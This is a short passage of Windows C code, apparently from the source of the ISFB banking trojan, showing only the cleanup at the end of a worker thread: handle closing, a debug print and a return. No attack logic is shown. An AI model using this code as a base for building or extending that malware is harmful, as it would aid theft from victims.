		CloseHandle(hStoreTimer);
	if (hConfigTimer)
		CloseHandle(hConfigTimer);
	if (hTaskTimer)
		CloseHandle(hTaskTimer);
	if (hConfigMutex)
		CloseHandle(hConfigMutex);
	if (hTaskMutex)
		CloseHandle(hTaskMutex);
	if (hRegEvent)
		CloseHandle(hRegEvent);

	DbgPrint("ISFB_%04x: MainRequestThread() ended with status: 0x%x.\n", g_CurrentProcessId, Status);

	LEAVE_WORKER();
	UNREFERENCED_PARAMETER(Context);
	return(Status);
}
